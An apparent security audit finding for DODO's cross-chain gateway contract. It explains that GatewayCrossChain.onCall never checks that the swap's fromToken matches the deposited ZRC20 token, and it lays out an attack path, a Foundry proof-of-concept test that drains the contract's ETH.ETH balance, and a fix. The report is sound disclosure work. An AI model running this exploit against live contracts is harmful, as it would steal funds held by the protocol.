# `GatewayCrossChain.onCall` Swaps Arbitrary Contract's ZRC20 When `swapDataZ.fromToken` Mismatches Deposited `zrc20`

### Summary

The [`GatewayCrossChain.onCall`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L442-L510) function fails to validate that the token specified for swapping in the user payload matches the token actually received. This allows anyone to deposit a low-value token via `GatewaySend` and force `GatewayCrossChain` to swap a different, valuable token from its own balance, leading to the draining of its ZRC20 holdings.

### Root Cause


The bug exists in how `GatewayCrossChain.onCall` handles the token for the DODO swap on ZetaChain.

1.  **Cross-chain Message:** `GatewayCrossChain.onCall` receives `amount` of `zrc20` tokens from ZetaChain's Gateway, originating from a source chain. It also receives a `message`.

    ```solidity
    function onCall(
        MessageContext calldata context,
        address zrc20, // Token received from source chain
        uint256 amount, // Amount of zrc20 received
        bytes calldata message // User-controlled payload (after externalId)
    ) external onlyGateway {
        // ...
        bytes calldata _message = message[32:]; // Original payload
        (DecodedMessage memory decoded, MixSwapParams memory params) = 
            SwapDataHelperLib.decodeMessage(_message);
        // params.fromToken and params.fromTokenAmount are from _message
        // ...
        uint256 platformFeesForTx = _handleFeeTransfer(zrc20, amount);
        uint256 amountAfterFee = amount - platformFeesForTx;
        // ...
        uint256 outputAmount = _doMixSwap(decoded.swapDataZ, amountAfterFee, params);
        // ...
    }
    ```

2.  **Payload Decoding:** The `_message` is decoded. `decoded.swapDataZ` within this payload determines `params.fromToken` and `params.fromTokenAmount`. These are fully controlled by the user that initiated the cross-chain call via `GatewaySend`.

3.  **Approval in `_doMixSwap`:** The `_doMixSwap` function is called with `amountAfterFee` and `params`.

    ```solidity
    function _doMixSwap(
        bytes memory swapData, // This is decoded.swapDataZ
        uint256 amount,        // This is amountAfterFee (amount of initial zrc20)
        MixSwapParams memory params
    ) internal returns (uint256 outputAmount) {
        if (swapData.length == 0) {
            return amount;
        }

        // @audit Approves params.fromToken (from payload) using 'amount' 
        // @audit If params.fromToken != zrc20, it approves its *own* balance of params.fromToken.
        IZRC20(params.fromToken).approve(DODOApprove, amount); 
        return IDODORouteProxy(DODORouteProxy).mixSwap(
            params.fromToken,
            params.toToken,
            params.fromTokenAmount, // Uses amount from payload for the swap
            // ... other params
        );
    }
    ```

    The core issue is: `IZRC20(params.fromToken).approve(DODOApprove, amount);`.
    *   `params.fromToken` can be any token address specified by the user in the payload.
    *   `amount` is the quantity of the `zrc20` that was actually deposited and received by `onCall` (after fees).
    *   **There is no check to ensure that `params.fromToken` is the same as the `zrc20` token prior to `_doMixSwap`.**
    *   If `params.fromToken` is different from `zrc20`, `GatewayCrossChain` approves `DODOApprove` to spend `amount` units of its *own holdings* of `params.fromToken`.

4.  **DODO Swap Execution:** The subsequent `IDODORouteProxy.mixSwap` call then uses `params.fromTokenAmount` as the quantity of `params.fromToken` to swap.  If `params.fromTokenAmount` is less than or equal to `amount`, the DODO swap will proceed, taking `params.fromTokenAmount` of `params.fromToken` from `GatewayCrossChain`'s balance.

The bug allows anyone to specify any `params.fromToken` they want and use the `amount` of the `zrc20` they deposited as the approval limit for that `params.fromToken`. The swap then uses `params.fromTokenAmount`.

### Internal Pre-conditions

1.  The `GatewayCrossChain` contract must have a non-zero balance of a ZRC20 token that the attacker intends to drain. This condition is highly likely to be met for various tokens over time, as the contract's refund mechanism can cause it to accumulate different ZRC20s.

### External Pre-conditions

1.  The DODO protocol on ZetaChain must have a liquidity pool for the swap pair defined in `params.fromToken` / `params.toToken`.
2.  ZetaChain's Gateway and the source chain's Gateway must be operational to relay the transaction and payload.


### Attack Path

1.  **Pre-condition:** `GatewayCrossChain` contract holds `1e18` of `ETH.ETH` ZRC20.
2.  **Attacker's Action:** Attacker initiates a cross-chain transaction via `GatewaySend.depositAndCall` that will trigger `GatewayCrossChain.onCall`.
    *   Attacker deposits `1e18` wei of `DAI` on the Ethereum chain. This `DAI` becomes `DAI.ETH` in `GatewayCrossChain.onCall`, and `amount` becomes `1e18`.
    *   The `payload` sent with this transaction is crafted so that when `SwapDataHelperLib.decodeMessage` processes it, `params` for the DODO swap are:
        *   `params.fromToken`: `address(ETH.ETH)` the token to drain from `GatewayCrossChain`.
        *   `params.toToken`: `address(USDC.BASE)`.
        *   `params.fromTokenAmount`: `1e18`.
        *   `params.minReturnAmount`: `0`.
3.  **Execution within `GatewayCrossChain.onCall`:**
    *   `onCall` receives `amount = 1e18` of `zrc20 = DAI.ETH`.
    *   Assume platform fees are zero. `amountAfterFee` remains `1e18`.
    *   `_doMixSwap(swapDataZ, 1e18, params)` is called.
        *   Inside `_doMixSwap`: `IZRC20(params.fromToken).approve(DODOApprove, amount);` executes as `IZRC20(ETH.ETH).approve(DODOApprove, 1e18);`. The `GatewayCrossChain` contract approves `DODOApprove` to spend `1e18` wei of its *own* `ETH.ETH`.
        *   `IDODORouteProxy(DODORouteProxy).mixSwap(...)` is called with `params.fromTokenAmount = 1e18` of `params.fromToken = ETH.ETH`.
        *   The DODO swap pulls `1e18` `ETH.ETH` from `GatewayCrossChain`'s balance and swaps them for `USDC.BASE`.
    *   The `outputAmount` is then used in `_handleEvmOrSolanaWithdraw` to be sent to the attacker's specified destination.
4.  **Result**: The `GatewayCrossChain` contract's `ETH.ETH` balance is reduced by `1e18` wei. The attacker used `1e18` wei of `DAI` to achieve this. 

### Impact

Direct loss of ZRC20 token holdings from the `GatewayCrossChain` contract. An attacker can choose a valuable token held by `GatewayCrossChain` and swap it using a deposit of a less valuable token, limited only by the approval limits. This can be repeated to drain targeted balances.

### PoC

Add the following test in `test/GatewayCrossChain.t.sol`:

```solidity

/// @dev This bug allows anyone to use arbitary targetZRC20 for swap in GatewayCrossChain
/// @custom:command forge test --match-contract GatewayCrossChainTest --match-test test_FromTokenNoValidation --fork-url https://zetachain-evm.blockpi.network/v1/rpc/public
function test_FromTokenNoValidation() public {
    address targetContract = address(gatewayCrossChain);
    address attacker = makeAddr("attacker");
    uint256 amount = 1e18;

    // Assets
    ERC20Mock dai = new ERC20Mock("DAI", "DAI", 18);
    ERC20Mock usdc = new ERC20Mock("USD Coin", "USDC", 18); // Note: DODO Router Mock only support 18 decimals for this PoC
    ZRC20Mock zrc20DAI = new ZRC20Mock("ZetaChain DAI Ethereum", "DAI.ETH", 18);
    ZRC20Mock zrc20ETH = new ZRC20Mock("ZetaChain ETH Ethereum", "ETH.ETH", 18);
    ZRC20Mock zrc20USDC = new ZRC20Mock("ZetaChain USDC Base", "USDC.BASE", 18); // Note: DODO Router Mock only support 18 decimals for this PoC

    // Balances
    dai.mint(attacker, amount); // 1 DAI
    zrc20DAI.mint(address(gatewayZEVM), amount); // Deposited DAI.ETH on ZetaChain
    zrc20ETH.mint(targetContract, amount); // 1 ETH.ETH e.g. for refund failed cross-chain tx
    usdc.mint(address(gatewayB), amount * 2500); // 2500 USDC escrowed in gateway
    zrc20USDC.mint(address(dodoRouteProxyZ), amount * 2500); // Swaps Liquidity

    // Approvals
    vm.prank(attacker);
    dai.approve(address(gatewaySendA), amount);

    // Gateways
    gatewayA.setZRC20(address(dai), address(zrc20DAI));
    gatewayB.setZRC20(address(usdc), address(zrc20USDC));
    zrc20USDC.setGasFee(0); // For simplicity
    zrc20USDC.setGasZRC20(address(zrc20USDC));

    // 1 ETH = 2500 USDC
    dodoRouteProxyZ.setPrice(address(zrc20ETH), address(zrc20USDC), amount * 2500);

    // Payload
    address targetZRC20 = address(zrc20USDC); // !! To trigger the swap
    bytes memory sender = abi.encodePacked(attacker);
    bytes memory receiver = abi.encodePacked(attacker);
    bytes memory swapDataZ = encodeCompressedMixSwapParams(
        address(zrc20ETH), // !!! Bug's trigger
        address(zrc20USDC),
        amount,
        0,
        0,
        new address[](1),
        new address[](1),
        new address[](1),
        0,
        new bytes[](1),
        abi.encode(address(0), 0),
        block.timestamp + 600
    );
    bytes memory contractAddress = abi.encodePacked(address(gatewaySendB));
    bytes memory fromTokenA = abi.encodePacked(address(usdc));
    bytes memory toTokenA = abi.encodePacked(address(usdc));
    bytes memory swapDataA = "";
    bytes memory accounts = "";
    bytes memory payload = encodeMessage(
        2,
        targetZRC20,
        sender,
        receiver,
        swapDataZ,
        contractAddress,
        abi.encodePacked(fromTokenA, toTokenA, swapDataA),
        accounts
    );

    vm.prank(attacker);
    gatewaySendA.depositAndCall(targetContract, amount, address(dai), 2, payload);

    // Attacker successfully deposit 1 DAI from Ethereum and got 2500 USDC in Base
    assertEq(dai.balanceOf(attacker), 0);
    assertEq(usdc.balanceOf(attacker), 2500 * 1e18);
}
```

### Mitigation

In `GatewayCrossChain` prior calls to `_doMixSwap` function, enforce that the token being swapped (`params.fromToken`) is the same as the token received by `onCall` (`zrc20`). This ensures that only the funds actually deposited into `GatewayCrossChain` for the current `onCall` transaction are used for the subsequent DODO swap.
